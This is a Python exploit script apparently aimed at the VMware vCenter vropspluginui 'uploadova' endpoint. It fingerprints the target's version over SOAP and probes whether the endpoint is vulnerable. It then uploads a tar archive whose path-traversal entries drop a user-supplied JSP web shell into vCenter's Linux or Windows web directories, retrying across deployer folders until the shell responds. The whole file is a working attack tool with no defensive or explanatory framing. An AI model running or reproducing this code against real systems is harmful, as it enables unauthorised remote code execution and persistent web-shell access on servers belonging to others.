import os
import sys
import time
import urllib3
import tarfile
import argparse
import requests
from random import randint

urllib3.disable_warnings()

VUL_JSP = ""
VUL_URI = "/ui/vropspluginui/rest/services/uploadova"

HEADERS = {
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/20100101 Firefox/{0}.0".format(randint(68, 84))
}


def archive(File, Path):
    TAR = tarfile.open("Temp.tar", "w")
    print("[+] Adding " + File + " as " + Path + " to archive")
    TAR.add(File, Path)
    TAR.close()


def getValue(Response, Tag="vendor"):
    try:
        return Response.split("<" + Tag + ">")[1].split("</" + Tag + ">")[0]
    except:
        pass
    return ""


def getVersion(URL):
    res = requests.post(URL + "/sdk", verify=False, timeout=5, data=b"""<env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
      <env:Body>
      <RetrieveServiceContent xmlns="urn:vim25">
        <_this type="ServiceInstance">ServiceInstance</_this>
      </RetrieveServiceContent>
      </env:Body>
      </env:Envelope>""")
    if res.status_code == 200 and "VMware" in getValue(res.text, "vendor"):
        Version = getValue(res.text, "version")
        Build = getValue(res.text, "build")
        Full = getValue(res.text, "fullName")
        print("[+] Identified: " + Full, "good")
        return Version, Build
    print("Not a VMware system: " + URL, "error")
    sys.exit(0)


def checkVul(URL):
    try:
        res = requests.get(URL + VUL_URI, verify=False, timeout=10, headers=HEADERS)
        print(f"[*] Check {URL} is vul ...")
        if res.status_code == 405:
            print(f"[!] {URL} IS vul ...")
            return True
        else:
            print(f"[-] {URL} is NOT vul ...")
            return False
    except:
        print(f"[-] {URL} connect failed ...")
        return False


def checkShell(SHELL_URI):
    time.sleep(5)
    re = requests.get(SHELL_URI, verify=False, timeout=10, headers=HEADERS)
    if re.status_code == 200:
        return True
    else:
        return False


def uploadExp(URL):
    print("[*] Trying linux default payload...")
    jsp = os.path.basename(VUL_JSP)
    archive(jsp, f"../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/41/0/h5ngc.war/resources/{jsp}")
    res = requests.post(URL + VUL_URI, files={"uploadFile": open("Temp.tar", "rb")}, verify=False, timeout=10, headers=HEADERS)
    if "SUCCESS" in res.text:
        print("[+] Shell upload success, now check is shell exist...")
        if checkShell(URL + f"/ui/resources/{jsp}"):
            print(f"[+] Shell exist URL: {URL}/ui/resources/{jsp}")
        else:
            print("[-] Shell upload success, BUT NOT EXIST, trying Linux Random payload...")
            for i in range(0, 120):
                archive(jsp, f"../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/{i}/0/h5ngc.war/resources/{jsp}")
                res = requests.post(URL + VUL_URI, files={"uploadFile": open("Temp.tar", "rb")}, verify=False, timeout=10, headers=HEADERS)
                if "SUCCESS" in res.text and checkShell(URL + f"/ui/resources/{jsp}"):
                    return print(f"[+] Shell exist URL: {URL}/ui/resources/{jsp}")
    else:
        print("[-] Shell upload success, BUT NOT EXIST, trying windows payload...")
        archive(jsp, f"../../ProgramData/VMware/vCenterServer/data/perfcharts/tc-instance/webapps/statsreport/{jsp}")
        res = requests.post(URL + VUL_URI, files={"uploadFile": open("Temp.tar", "rb")}, verify=False, timeout=10, headers=HEADERS)
        if "SUCCESS" in res.text and checkShell(URL + f"/statsreport/{jsp}"):
            print(f"[+] Shell exist URL: {URL}/statsreport/{jsp}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="目标URL (e.g. https://192.168.1.1)", required=True)
    parser.add_argument("-s", "--shell", help="WebShell路径", required=True)
    args = parser.parse_args()

    VUL_JSP = args.shell
    Target  = args.target.rstrip("/")

    if not checkVul(Target): sys.exit(0)

    Version, Build = getVersion(Target)
    if (
        int(Version.split(".")[0]) == 6
        and int(Version.split(".")[1]) == 7
        and int(Build) >= 13010631
        ) or (
            (int(Version.split(".")[0]) == 7 and int(Version.split(".")[1]) == 0)
        ):
        print(f"[-] {Target} maybe running vCenter 6.7 U2+, and vCenter 6.7 U2+ running website in memory,so this exp may be not work well on vCenter 6.7 u2+.")
        if input("Do you still want to exploit?(y/n)").lower() == "y":
            uploadExp(Target)
    else:
        uploadExp(Target)